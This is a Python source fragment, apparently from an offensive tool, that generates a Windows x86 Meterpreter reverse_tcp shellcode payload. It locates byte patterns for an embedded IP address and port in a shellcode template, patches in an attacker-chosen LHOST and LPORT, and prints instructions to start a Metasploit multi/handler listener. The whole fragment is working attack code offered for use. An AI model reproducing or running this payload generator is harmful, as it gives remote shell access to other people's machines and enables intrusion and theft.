# Byte patterns to locate IP and port in the template
# push <ip>:           \x68 + 4 IP bytes
# push AF_INET + port: \x68\x02\x00 + 2 port bytes
_TPL_IP_PATTERN = b"\x68\xc0\xa8\x1e\x4d"
_TPL_PORT_PATTERN = b"\x68\x02\x00\x01\xbb"


def _ip_to_bytes(ip_str):
    parts = ip_str.split(".")
    if len(parts) != 4:
        raise ValueError(f"Invalid IP address: {ip_str}")
    return bytes(int(p) for p in parts)


def _port_to_bytes(port):
    return struct.pack(">H", port)


def _patch_shellcode(template, ip_pattern, port_pattern, ip_bytes, port_bytes):
    sc = bytearray(template)

    ip_idx = sc.find(ip_pattern)
    if ip_idx == -1:
        fatal("Could not locate IP pattern in shellcode template")
    sc[ip_idx + 1:ip_idx + 5] = ip_bytes

    port_idx = sc.find(port_pattern)
    if port_idx == -1:
        fatal("Could not locate port pattern in shellcode template")
    sc[port_idx + 3:port_idx + 5] = port_bytes

    return bytes(sc)


def generate_reverse_shell(lhost, lport, arch):
    ip_bytes = _ip_to_bytes(lhost)
    port_bytes = _port_to_bytes(lport)

    if arch == "x86":
        sc = _patch_shellcode(_TEMPLATE_X86, _TPL_IP_PATTERN, _TPL_PORT_PATTERN, ip_bytes, port_bytes)
        info("Payload: meterpreter/reverse_tcp (x86)")
        info(f"LHOST={lhost} LPORT={lport}")
        warning("Handler required: use exploit/multi/handler with windows/meterpreter/reverse_tcp")
        success(f"Shellcode ready: {len(sc)} bytes")
        return sc

    elif arch == "x64":
        fatal("Built-in x64 payload not available. Use --msfvenom or -s with a raw shellcode file")

    else:
        fatal(f"Unsupported architecture: {arch}")
